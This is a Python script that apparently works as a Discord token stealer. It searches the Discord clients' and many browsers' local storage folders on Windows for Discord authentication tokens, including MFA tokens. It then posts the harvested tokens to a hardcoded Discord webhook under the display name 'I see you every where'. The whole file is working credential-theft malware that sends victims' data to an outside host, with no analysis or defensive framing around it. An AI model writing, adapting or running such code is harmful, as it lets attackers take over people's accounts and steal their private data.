import os
import re
import requests
import json
import base64
import sqlite3
from config import hook

# Define the webhook URL
hook = "https://discord.com/api/webhooks/1334621575697399971/sMMx2WB2upomIGi2e3RiBKziDqx_cHTJ5HkSjPCnUqY09K2EWfad8eQ452r4Fx32q9Ne"

def get_discord_tokens(path):
    tokens = []
    if os.path.exists(path):
        for file_name in os.listdir(path):
            if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                with open(os.path.join(path, file_name), errors="ignore") as file:
                    for line in file.readlines():
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in re.findall(regex, line):
                                tokens.append(token)
    return tokens

def get_browser_data(path):
    data = {}
    if os.path.exists(path):
        try:
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value FROM meta")
            data = dict(cursor.fetchall())
            conn.close()
        except sqlite3.Error as e:
            print(f"SQLite error: {e}")
    return data

def find_tokens():
    local = os.getenv("localAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        "Discord": roaming + "\\Discord",
        "Discord Canary": roaming + "\\discordcanary",
        "Discord PTB": roaming + "\\discordptb",
        "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        "Opera": roaming + "\\Opera Software\\Opera Stable",
        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
        'Lightcord': roaming + "\\Lightcord",
        'Opera GX': roaming + "\\Opera Software\\Opera GX Stable",
        'Amigo': local + "\\Amigo\\User Data",
        'Torch': local + "\\Torch\\User Data",
        'Kometa': local + "\\Kometa\\User Data",
        'Orbitum': local + "\\Orbitum\\User Data",
        'CentBrowser': local + "\\CentBrowser\\User Data",
        'Sputnik': local + "\\Sputnik\\Sputnik\\User Data",
        'Chrome SxS': local + "\\Google\\Chrome SxS\\User Data",
        'Epic Privacy Browser': local + "\\Epic Privacy Browser\\User Data",
        'Microsoft Edge': local + "\\Microsoft\\Edge\\User Data\\Default",
        'Uran': local + "\\uCozMedia\\Uran\\User Data\\Default",
        'Iridium': local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
        'Firefox': roaming + "\\Mozilla\\Firefox\\Profiles",
    }

    tokens = []
    for platform, path in paths.items():
        if platform in ["Discord", "Discord Canary", "Discord PTB"]:
            token_path = os.path.join(path, "Local Storage", "leveldb")
            tokens.extend(get_discord_tokens(token_path))
        else:
            token_path = os.path.join(path, "local Storage", "leveldb")
            tokens.extend(get_discord_tokens(token_path))

            # Get browser data (username, badges, etc.)
            browser_data_path = os.path.join(path, "Local Storage", "leveldb", "meta.sqlite")
            browser_data = get_browser_data(browser_data_path)
            if browser_data:
                tokens.append(f"{platform} - Username: {browser_data.get('username', 'N/A')}, Badges: {browser_data.get('badges', 'N/A')}")

    tokendata = {
        "avatar_url": "https://i.pinimg.com/736x/c1/0e/84/c10e84ba1e5c2472c91ea3b6ecc7df44.jpg",
        "username": "I see you every where",
        "embeds": [
            {
                "title": "Czyjaś zguba",
                "fields": [
                    {
                        "name": "Znaleziono tokeny:",
                        "value": "\n".join(tokens),
                    }
                ],
                "image": {
                    "url": "https://i.pinimg.com/originals/f7/19/65/f71965732082901a89adedcde2051bd7.gif",
                    "height": 0,
                    "width": 0
                }
            }
        ],
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(hook, data=json.dumps(tokendata), headers=headers)
    if response.status_code == 204:
        print("Tokens sent successfully.")
    else:
        print(f"Failed to send tokens. Status code: {response.status_code}")

if __name__ == "__main__":
    find_tokens()